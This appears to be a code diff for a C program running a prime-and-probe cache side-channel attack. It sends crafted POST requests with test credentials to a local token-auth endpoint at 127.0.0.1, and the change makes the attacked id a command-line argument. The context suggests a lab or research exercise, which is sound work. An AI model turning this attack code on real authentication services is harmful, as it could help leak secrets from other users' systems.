@@ -19,7 +19,13 @@
 // avg cache fetch time = 30 cycles
 
 int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
-int main() {
+int main(int argc, char* argv[]) {
+    char* attack_id = "2";
+    if (argc == 2){
+        attack_id = argv[1]; 
+    }
+
+
     int count[SETS] = {0};
     curl_global_init(CURL_GLOBAL_ALL);
     int loops = 100;
@@ -40,7 +46,7 @@ int main() {
         
         _mm_mfence(); // wait for prime to compelte before sending bad request
         // cache check 
-        bad_request();
+        bad_request(attack_id);
         _mm_mfence();
 
         check_cache_presence(count);
@@ -73,14 +79,15 @@ void valid_request(){
 
 }
 
-void bad_request(){
+void bad_request(char *attack_id){
         CURL *curl_handle;
     //CURLcode res;
 
     curl_handle = curl_easy_init();
     if (curl_handle){
-        char *data = "username=user1&password=password&id=800";
-
+        char data[42];
+        snprintf(data, 42, "username=user1&password=password&id=%s", attack_id);
+        
         curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
         curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
 
